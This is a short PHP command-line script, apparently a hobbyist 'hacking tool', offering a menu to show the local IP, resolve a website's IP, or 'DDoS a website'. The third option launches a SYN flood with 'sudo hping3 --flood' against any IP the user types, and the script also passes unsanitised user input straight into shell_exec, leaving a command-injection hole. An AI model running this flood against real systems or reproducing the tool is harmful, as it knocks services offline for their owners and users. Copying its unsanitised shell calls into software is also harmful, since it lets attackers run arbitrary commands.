<?php
$a=0;
function line($a){
while($a!=25){
echo("--");
$a++;
}
$a=0;
}
line(0);
function br(){
echo "\n";
}
br();
echo "\t\tAyaan's Tool\n" ;
line(0);
br();
line(0);
br();
br();
echo "Choose your attack:- \n\n 1=> See your ip address \n 2=> find the ip address of any wesite \n 3=> DDoS a website \n Input your option =>  ";
$choice = readline();
switch($choice){
case 1:{
 $ipdetails =  shell_exec("ifconfig | grep inet ");
br();
print( $ipdetails);
break;
}
case 2:{
$u=readline("Enter the url of website => ");
$asa=shell_exec("host -4 " .$u. " | grep -E -o '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'" );
br();
echo "Ip address of $u => ";
br();
echo $asa;
//echo $asa;

break;
}
case 3:{
$at= readline("Enter the ip address =>  ");
echo "Attacking";
echo ".";
echo ".";
echo ".";
echo ".";
echo "=";
echo "=";
echo "=";
echo ">";
echo ">";
echo ">";
echo ">";
br();
$ak=shell_exec(" sudo hping3 -p 80 -d 200 -S --flood ".$at);
br();
echo($ak);
break;
}
}
?>
